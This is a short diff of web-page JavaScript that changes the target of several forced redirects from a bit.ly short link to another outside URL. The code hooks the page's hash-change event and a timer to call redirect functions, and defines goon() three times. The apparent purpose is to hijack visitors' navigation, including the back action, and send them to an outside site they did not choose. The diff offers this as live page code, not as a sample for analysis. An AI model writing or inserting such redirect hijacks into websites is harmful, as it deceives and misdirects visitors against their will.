@@ -4,14 +4,14 @@ window.onhashchange=function(){jp();};
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://bit.ly/3W6qUJU";
+        location.href="https://omg10.com/4/10873160";
     }
     function goon(){
-        location.href="https://bit.ly/3W6qUJU";
+        location.href="https://omg10.com/4/10873160";
     }
 function goon(){
-        location.href="https://bit.ly/3W6qUJU";
+        location.href="https://omg10.com/4/10873160";
     }
 function goon(){
-        location.href="https://bit.ly/3W6qUJU";
+        location.href="https://omg10.com/4/10873160";
     }
